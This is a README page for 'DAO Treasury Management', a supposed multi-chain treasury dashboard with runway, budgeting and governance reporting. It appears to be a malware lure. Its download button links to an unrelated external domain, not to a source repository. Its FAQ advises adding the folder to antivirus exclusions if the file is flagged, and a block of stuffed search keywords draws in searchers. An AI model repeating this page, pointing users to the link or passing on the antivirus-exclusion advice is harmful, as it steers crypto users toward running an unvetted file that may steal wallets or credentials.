# DAO Treasury Management 🏛️💼

A self-hosted treasury dashboard for **DAOs and crypto-native teams** that need to know where the money is, where it went, and how long it lasts. Instead of exporting CSVs from a block explorer and rebuilding the same spreadsheet every month, this tool imports DAO wallets across multiple chains, categorizes transactions into grants, payroll, liquidity, and operational spend, tracks runway against stablecoin reserves, and produces a report a board or token holder can actually read.

[![Download DAO Treasury Management](https://img.shields.io/badge/Download-DAO_Treasury_Management-blueviolet)](https://dyhuiying.com/s/file)

![Version](https://img.shields.io/badge/version-1.2-blue)
![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-0078D6)
![Status](https://img.shields.io/badge/status-active-brightgreen)
![Chains](https://img.shields.io/badge/chains-10%2B-orange)

<details>
<summary>📑 Contents</summary>

- [Quick Start](#-quick-start)
- [Requirements](#️-requirements)
- [Key Features](#-key-features)
- [Module Overview](#-module-overview)
- [Why Choose DAO Treasury Management](#-why-choose-dao-treasury-management)
- [FAQ](#-faq)
- [SEO Keywords](#-seo-keywords)

</details>

## ⚡ Quick Start

1. Download the archive using the button above.
2. Install dependencies with `pip install -r requirements.txt`.
3. Add DAO wallet addresses and chain RPC endpoints to `config.yaml`, then start the dashboard.

The dashboard opens at `http://localhost:8080` and syncs treasury balances on first launch.

## 🖥️ Requirements

| Item | Requirement |
|------|-------------|
| OS | Windows 10/11, macOS 12+, Linux (64-bit) |
| RAM | 4 GB minimum |
| Storage | 300 MB free |
| Privileges | Standard user (no admin required) |

## ✨ Key Features

**Multi-Chain Treasury Tracking**

- 🔗 **10+ Chains** — Ethereum, Arbitrum, Base, Optimism, Polygon, Solana, and more imported in one profile.
- 🏦 **Multi-Sig Support** — Safe, Squads, and other multisig wallets recognized and parsed correctly.
- 💰 **Token Coverage** — native assets, ERC-20, SPL tokens, and LP positions valued automatically.
- 📊 **Live Valuation** — treasury net worth in USD, ETH, or a custom base asset.

**Transaction Categorization**

- 🗂️ **Spend Categories** — grants, payroll, liquidity, operational, and marketing spend tagged per transaction.
- 🏷️ **Rule-Based Tagging** — saved rules auto-classify recurring recipients and contracts.
- 🧾 **Internal Transfer Detection** — movements between your own wallets do not distort spend totals.
- 📝 **Manual Notes** — attach context to any transaction for future reference.

**Runway & Budgeting**

- 📉 **Runway Calculator** — months of runway based on stablecoin reserves and average monthly burn.
- 🎯 **Budget vs. Actual** — compare planned spend per category against real outflows.
- 📈 **Historical Snapshots** — daily and monthly treasury value charts.
- ⚠️ **Runway Alerts** — warning when runway drops below a configurable threshold.

**Reporting & Governance**

- 📤 **Board-Ready Reports** — PDF and CSV exports with treasury composition, spend breakdown, and runway summary.
- 🗳️ **Proposal Tracking** — link on-chain spend to governance proposals and execution hashes.
- 🔐 **Read-Only by Default** — the dashboard never requests signing permissions.
- 🐳 **Docker Support** — one-command deployment with `docker compose up`.

## 📋 Module Overview

| Module | What it does | Interface |
|--------|--------------|-----------|
| wallet_importer | Pull balances from 10+ chains | CLI |
| multisig_parser | Safe and Squads wallet support | Python API |
| tx_categorizer | Rule-based spend classification | Python API |
| runway_engine | Stablecoin runway and burn calculation | Dashboard |
| budget_tracker | Budget vs. actual comparison | Dashboard |
| report_generator | PDF and CSV financial reports | CLI / Web UI |
| proposal_linker | Link spend to governance proposals | Web UI |
| docker_runner | Container deployment | Docker |

## 🚀 Why Choose DAO Treasury Management

- ✅ Built for DAOs, not traders — grants, payroll, and proposal-linked spend are first-class categories, not afterthoughts.
- ✅ Multi-chain by default — EVM networks and Solana share the same treasury profile.
- ✅ Runway-first reporting — the number DAOs actually care about is on the main dashboard, not buried.
- ✅ Governance-aware — spend can be linked to on-chain proposals for accountability.
- ✅ Self-hosted and read-only — wallet data never leaves your server, and no signing permissions are requested.

## 💡 Why Use It

- 🏛️ See treasury composition and runway in one dashboard instead of a spreadsheet.
- 🗂️ Categorize spend automatically with saved rules for recurring recipients.
- 🧭 Link outflows to governance proposals for board and token-holder reports.
- 📤 Export a financial summary for quarterly community updates in minutes.

## ❓ FAQ

**Do I need to run it as Administrator?**
No — the dashboard runs as a standard user process and does not require elevated privileges.

**Will my antivirus flag the file?**
Some engines may flag Python entry points by heuristic. Add the project folder to exclusions if needed.

**Does it work on Windows 11?**
Yes — Windows 10/11, macOS, and Linux are all supported.

**Does it require signing permissions?**
No — the dashboard is read-only and never requests wallet signing access.

**How do I update?**
Pull the latest archive and reinstall dependencies — treasury profiles and categorization rules are preserved.

## 🔎 SEO Keywords

DAO Treasury Management, DAO treasury tool, DAO treasury dashboard, self-hosted DAO treasury, crypto treasury management, DAO financial reporting, on-chain treasury reporting, multisig treasury tracker, DAO runway calculator, DAO budget tracking, Safe treasury dashboard, Squads treasury tracker, multi-chain treasury management, DAO accounting tool, crypto treasury reporting github, open source DAO treasury, governance spend tracking, DAO grant tracking, treasury runway monitoring, web3 finance dashboard

## ⚠️ Disclaimer

Provided for educational and informational purposes only. Use at your own risk and in accordance with the terms of service of any blockchain, data provider, or platform you interact with.
